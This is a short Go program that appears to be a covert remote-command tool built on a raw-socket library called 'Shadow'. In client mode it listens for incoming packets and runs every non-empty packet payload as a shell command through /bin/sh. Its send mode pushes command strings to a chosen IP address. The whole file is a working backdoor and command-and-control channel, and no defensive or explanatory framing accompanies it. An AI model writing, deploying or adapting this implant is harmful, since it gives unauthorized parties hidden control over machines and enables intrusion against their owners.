package main

import (
	"context"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"

	"github.com/DaveTheBearMan/Shadow/shadow"
)

func execCommand(command string) ([]byte, error) {
	result, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
	if err != nil {
		return nil, err
	}
	return result, nil
}

func main() {
	SocketFile := shadow.CreateSendSocket()

	switch os.Args[1] {
	case "Client", "client", "--client":
		packetChannel := shadow.Listen(context.Background())

		fmt.Printf("-- [PROTO] %-18s%-18s%-s\n", "Destination IP", "Source IP", "Data")
		for packet := range packetChannel {
			fmt.Printf("-> [%-3s]   %-18s%-18s%-s\n", packet.GetProtocol(), packet.GetSourceAddrStr(), packet.GetDestAddrStr(), packet.GetPayload())

			if len(packet.GetPayload()) > 0 {
				result, err := execCommand(string(packet.GetPayload()))
				if err != nil {
					fmt.Printf("!! ERROR: %-65v", err)
				}

				resLen := len(result)
				switch {
				case resLen == 0:
					fmt.Printf("<- Success\n")
				case resLen <= 75:
					fmt.Printf("<- %-70s ...\n", result)
				default:
					fmt.Printf("<- %-75s\n", result)
				}
			}
		}
	case "send", "exec", "write", "--send":
		IpAddrStr := os.Args[2]
		IpAddr, _, err := net.ParseCIDR(IpAddrStr)
		if err != nil {
			fmt.Printf("Unable to parse CIDR: % v", err)
			os.Exit(65)
		}

		shadow.Send(SocketFile, IpAddr, os.Args[3], os.Args[4], strings.Join(os.Args[5:], " "))
	}
}
